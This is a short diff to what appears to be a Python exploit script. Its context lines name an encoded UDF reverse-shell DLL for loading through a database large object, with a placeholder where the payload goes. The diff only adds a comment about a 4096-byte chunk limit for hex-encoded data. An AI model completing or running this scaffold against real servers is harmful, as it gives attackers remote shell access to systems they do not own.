@@ -1,6 +1,8 @@
 import requests, sys, urllib, string, random, time
 requests.packages.urllib3.disable_warnings()
 
+# instances of FIX ME will need to be 4096 at max, as hex will double the size of the raw bytes, and will be halfed when decoded
+
 # encoded UDF rev_shell dll
 udf ='YOUR DLL GOES HERE'
 loid = 1337
